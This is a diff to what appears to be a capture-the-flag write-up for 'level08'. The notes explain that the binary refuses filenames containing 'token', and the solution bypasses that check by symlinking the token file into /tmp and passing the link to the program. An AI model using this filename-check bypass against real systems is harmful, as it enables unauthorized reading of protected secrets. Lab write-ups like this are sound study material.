@@ -682,14 +682,16 @@ write(1, "aB\n", 3aB
 ```
 
 Observation:
-- it reads the contents of a file
-- as long as the filename contains no "token" as substr
+
+- it reads file contents, as long as the filename contains no substr "token" 
 - renaming `./token` is not allowed
 - but we can make a symlink of it
   - syntax: `ln -s real_path_src real_path_symlink`
 
 Solution
+
 ```b
-> ln -s `realpath token` /tmp/tok
+> ln -s `realpath token` /tmp/totem
+> ./level08 /tmp/totem
 ```
 
